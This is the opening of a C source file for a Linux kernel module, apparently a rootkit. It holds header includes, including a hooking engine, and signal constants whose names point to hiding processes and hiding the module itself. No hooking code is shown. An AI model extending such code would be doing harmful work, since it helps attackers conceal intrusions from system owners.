#include "../inc/process.h"
#include <linux/signal.h>
#include <khook/engine.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/pid.h>
#include <net/sock.h>
#include <linux/fs.h>
#include <linux/fdtable.h>

const int SIGINVISPROC = SIGRTMIN; //32
const int SIGVISPROC = SIGRTMIN + 1; //33
const int SIGINVISMOD = SIGRTMIN + 2; //34